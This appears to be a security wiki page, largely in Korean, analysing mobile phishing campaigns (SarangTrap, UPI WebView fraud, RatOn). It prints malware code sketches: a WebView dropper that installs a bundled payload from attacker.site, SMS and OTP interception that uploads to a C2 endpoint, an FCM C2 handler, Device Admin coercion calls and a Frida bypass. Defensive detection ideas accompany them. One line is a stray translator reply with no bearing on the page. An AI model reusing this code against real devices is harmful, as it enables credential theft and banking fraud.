# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 위협 행위자들이 **malicious Android APKs** 및 **iOS mobile-configuration profiles**을(를) SEO, social engineering, fake stores, dating apps 등과 같은 phishing을 통해 배포하는 데 사용하는 기법들을 다룹니다. 자료는 Zimperium zLabs가 공개한 SarangTrap 캠페인 (2025) 및 기타 공개 연구를 바탕으로 합니다.

## 공격 흐름

1. **SEO/Phishing Infrastructure**
* 유사 도메인(데이트 사이트, 클라우드 공유, 차량 서비스 등)을 수십 개 등록.
– Google에서 순위를 올리기 위해 `<title>` 요소에 지역 언어 키워드와 이모지 사용.
– 동일 랜딩 페이지에 Android (`.apk`) 및 iOS 설치 지침을 모두 호스팅.
2. **1단계 다운로드**
* Android: *unsigned* 또는 “third-party store” APK로 연결되는 직접 링크.
* iOS: `itms-services://` 또는 일반 HTTPS 링크로 악성 **mobileconfig** 프로파일로 연결.
3. **설치 후 Social Engineering**
* 앱을 처음 실행하면 **초대 / 인증 코드**를 요구(독점 접근의 환상).
* 코드는 Command-and-Control (C2)로 **HTTP를 통한 POST**로 전송된다.
* C2가 `{"success":true}`로 응답 ➜ malware가 계속 작동.
* 유효한 코드를 제출하지 않는 Sandbox / AV dynamic analysis는 **no malicious behaviour**를 관찰(회피).
4. **런타임 권한 남용 (Android)**
* 위험 권한은 긍정적인 C2 응답 후에만 요청된다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 최근 변종은 `AndroidManifest.xml`에서 SMS 관련 `<uses-permission>`를 제거하지만 Java/Kotlin 코드 경로는 reflection을 통해 SMS를 읽는 코드를 남겨둠 ⇒ 정적 평점은 낮아지지만 `AppOps` 오용이나 오래된 타깃에서 권한이 허용된 기기에서는 여전히 동작.
5. **겉보기 UI 및 백그라운드 수집**
* 앱은 로컬로 구현된 무해한 뷰(SMS viewer, gallery picker)를 표시.
* 동시에 다음을 유출/수집:
- IMEI / IMSI, 전화번호
- 전체 `ContactsContract` 덤프 (JSON 배열)
- `/sdcard/DCIM`의 JPEG/PNG를 [Luban](https://github.com/Curzibn/Luban)으로 압축하여 크기 축소
- 선택적 SMS 내용 (`content://sms`)
페이로드는 **batch-zipped**되어 `HTTP POST /upload.php`로 전송.
6. **iOS 전달 기법**
* 단일 **mobile-configuration profile**이 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등으로 기기를 “MDM”-유사 감독에 등록할 수 있음.
* Social-engineering 지침:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (스크린샷은 피싱 페이지 참조).
3. Trust the unsigned profile ➜ 공격자가 App Store 검토 없이 *Contacts* 및 *Photo* 권한 획득.
7. **네트워크 계층**
* Plain HTTP, 종종 포트 80에서 HOST 헤더 예: `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → 탐지 쉬움).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – malware 평가 중 Frida/Objection으로 초대 코드 단계를 자동화해 악성 분기로 도달.
* **Manifest vs. Runtime Diff** – `aapt dump permissions`와 런타임 `PackageManager#getRequestedPermissions()`를 비교; 위험 권한이 누락된 경우 경고 신호.
* **Network Canary** – 코드 입력 후 비정상적인 POST 급증을 탐지하기 위해 `iptables -p tcp --dport 80 -j NFQUEUE` 구성.
* **mobileconfig Inspection** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용해 `PayloadContent`를 나열하고 과도한 권한 요청을 식별.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics**로 키워드가 풍부한 도메인의 갑작스런 생성 폭증 포착.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` — Google Play 외부의 Dalvik 클라이언트에서 오는 요청을 감지.
* **Invite-code Telemetry** – APK 설치 직후 6–8자리 숫자 코드의 POST는 스테이징 가능성 시사.
* **MobileConfig Signing** – MDM 정책을 통해 서명되지 않은 configuration profiles 차단.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 패턴

이 패턴은 정부 혜택 테마를 악용해 인도 UPI 자격 증명과 OTP를 탈취하는 캠페인에서 관찰되었습니다. 운영자들은 전달성과 복원력을 위해 신뢰할 수 있는 플랫폼들을 연계합니다.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

정적 분석 팁 (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 단축 링크를 통한 동적 엔드포인트 발견
- Malware는 단축 링크에서 일반 텍스트(쉼표로 구분된) 활성 엔드포인트 목록을 가져오며; 간단한 문자열 변환으로 최종 phishing 페이지 경로를 생성한다.

예시(익명 처리됨):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
의사 코드:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” 단계는 WebView 내부에서 동적 엔드포인트로부터 공격자 HTML 폼을 로드하고 민감한 필드(전화번호, 은행, UPI PIN)를 캡처한 뒤 이를 `POST`로 `addup.php`에 전송합니다.

간단한 로더:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 최초 실행 시 과도한 권한을 요청합니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처를 반복 처리하여 피해자 기기에서 smishing SMS를 대량 발송합니다.
- 수신 SMS는 broadcast receiver에 의해 가로채져 메타데이터(발신자, 본문, SIM 슬롯, 기기별 랜덤 ID)와 함께 `/addsm.php`로 업로드됩니다.

리시버 스케치:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM)를 복원력 있는 C2로 사용
- Payload는 FCM에 등록되며; 푸시 메시지는 액션을 트리거하기 위해 스위치로 사용되는 `_type` 필드를 포함합니다 (예: phishing 텍스트 템플릿 업데이트, 동작 토글).

예시 FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
핸들러 스케치:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Detection & defence ideas
- 설치 중 네트워크 비활성화를 지시한 뒤 `assets/`에서 두 번째 APK를 사이드로드하는 앱 표시
- 다음 권한 튜플에 대해 경고: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView 기반 결제 흐름
- 비기업 호스트에서 `POST /addup.php|/addsm.php`에 대한 egress 모니터링; 알려진 인프라 차단
- Mobile EDR 규칙: 신뢰되지 않은 앱이 FCM에 등록하고 `_type` 필드로 분기하는 경우

---

## Android Accessibility/Overlay & Device Admin 악용, ATS 자동화 및 NFC 중계 오케스트레이션 – RatOn 사례 연구

The RatOn banker/RAT campaign (ThreatFabric)은 현대 모바일 피싱 작전이 WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, 심지어 NFC-relay orchestration을 결합하는 구체적 예시다. 이 섹션은 재사용 가능한 기술을 추상화한다.

### Stage-1: WebView → 네이티브 설치 브리지 (dropper)
공격자는 공격자 페이지를 가리키는 WebView를 표시하고 native installer를 노출하는 JavaScript interface를 주입한다. HTML 버튼을 탭하면 네이티브 코드가 호출되어 dropper의 assets에 번들된 2단계 APK를 설치하고 즉시 실행한다.

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
HTML 또는 마크다운 내용을 붙여 넣어 주세요. 그러면 해당 내용을 규칙에 맞춰 한국어로 번역해 드리겠습니다.
```html
<button onclick="bridge.installApk()">Install</button>
```
설치 후 dropper는 explicit package/activity를 통해 payload를 시작합니다:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
헌팅 아이디어: 신뢰할 수 없는 앱이 `addJavascriptInterface()`를 호출하고 WebView에 인스톨러와 유사한 메서드를 노출하는 경우; APK가 `assets/` 아래에 포함된 2차 페이로드를 포함해 배포하고 Package Installer Session API를 호출하는 경우.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2에서는 “Access” 페이지를 호스팅하는 WebView를 연다. 그 버튼은 피해자를 Accessibility 설정으로 이동시키고 악성 서비스를 활성화하도록 요청하는 exported 메서드를 호출한다. 일단 허용되면, 악성코드는 Accessibility를 사용해 이후 런타임 권한 대화상자(contacts, overlay, manage system settings 등)를 자동으로 클릭하고 Device Admin을 요청한다.

- Accessibility는 노드 트리에서 “Allow”/“OK” 같은 버튼을 찾아 클릭을 디스패치하여 이후 프롬프트를 프로그래밍 방식으로 승인하는 데 도움을 준다.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
참고:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView를 이용한 오버레이 피싱/랜섬
운영자는 다음과 같은 명령을 보낼 수 있음:
- URL에서 전체 화면 오버레이를 렌더링하거나,
- WebView 오버레이에 로드되는 인라인 HTML을 전달.

사용 예: 강요(coercion) (PIN 입력), wallet 열기로 PIN 탈취, 랜섬 메시지 전송. 오버레이 권한이 없으면 권한이 부여되었는지 확인하는 명령을 유지.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: 주기적으로 Accessibility node tree를 덤프하고, 보이는 텍스트/role/영역(bounds)을 직렬화하여 pseudo-screen으로 C2에 전송 (예: `txt_screen`은 일회성, `screen_live`는 지속).
- High-fidelity: MediaProjection을 요청하고 필요 시 screen-casting/recording을 시작 (예: `display` / `record`).

### ATS playbook (bank app automation)
JSON 작업이 주어지면, 은행 앱을 열고 Accessibility를 통해 텍스트 쿼리와 좌표 탭을 혼합해 UI를 조작하며, 입력을 요구하면 피해자의 결제 PIN을 입력.

예시 작업:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
한 타깃 플로우에서 확인된 예시 텍스트 (CZ → EN):
- "Nová platba" → "새 결제"
- "Zadat platbu" → "결제 입력"
- "Nový příjemce" → "새 수취인"
- "Domácí číslo účtu" → "국내 계좌번호"
- "Další" → "다음"
- "Odeslat" → "보내기"
- "Ano, pokračovat" → "예, 계속"
- "Zaplatit" → "결제하기"
- "Hotovo" → "완료"

운영자는 `check_limit` 및 `limit` 같은 명령을 통해 한도 UI를 유사하게 탐색하여 이체 한도를 확인하거나 상향 조정할 수도 있습니다.

### Crypto wallet seed extraction
MetaMask, Trust Wallet, Blockchain.com, Phantom 같은 대상. 흐름: unlock(도난당한 PIN 또는 제공된 비밀번호), Security/Recovery로 이동해 reveal/show seed phrase를 표시하고, keylog/exfiltrate합니다. EN/RU/CZ/SK 언어에 맞춘 locale-aware selectors를 구현하여 다국어에서의 탐색을 안정화하세요.

### Device Admin coercion
Device Admin APIs는 PIN-capture 기회를 늘리고 피해자를 방해하기 위해 사용됩니다:

- 즉시 잠금:
```java
dpm.lockNow();
```
- 현재 자격 증명을 만료시켜 변경을 강제 (Accessibility가 새 PIN/password를 캡처):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard의 생체 인증 기능을 비활성화하여 비생체 잠금 해제를 강제:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
참고: 많은 DevicePolicyManager 제어는 최근 Android에서 Device Owner/Profile Owner를 요구합니다; 일부 OEM 빌드는 느슨할 수 있습니다. 항상 대상 OS/OEM에서 검증하세요.

### NFC 릴레이 오케스트레이션 (NFSkate)
Stage-3은 외부 NFC-relay 모듈(예: NFSkate)을 설치하고 실행할 수 있으며 릴레이 동안 피해자를 안내하기 위한 HTML 템플릿을 전달할 수도 있습니다. 이는 contactless card-present cash-out을 온라인 ATS와 함께 가능하게 합니다.

배경: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator 명령 세트 (샘플)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (인라인 HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### 탐지 및 방어 아이디어 (RatOn 스타일)
- WebViews에서 `addJavascriptInterface()`로 installer/permission 메서드를 노출하는 것을 탐지하세요; Accessibility 프롬프트를 유발하는 “/access”로 끝나는 페이지를 주의합니다.
- 서비스 접근 권한 부여 직후 고빈도 Accessibility 제스처/클릭을 생성하는 앱에 대해 경보를 설정하세요; Accessibility node dumps와 유사한 텔레메트리가 C2로 전송되는 경우도 탐지합니다.
- 신뢰할 수 없는 앱에서의 Device Admin 정책 변경을 모니터링하세요: `lockNow`, 비밀번호 만료, keyguard 기능 토글 등.
- 비기업(비사내) 앱에서의 MediaProjection 프롬프트 이후 주기적 프레임 업로드가 발생하면 경보를 발합니다.
- 다른 앱에 의해 트리거된 외부 NFC-relay 앱의 설치/실행을 탐지하세요.
- 뱅킹의 경우: out-of-band 확인, biometrics-binding, 온-디바이스 자동화에 저항하는 거래 한도 적용을 강제하세요.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
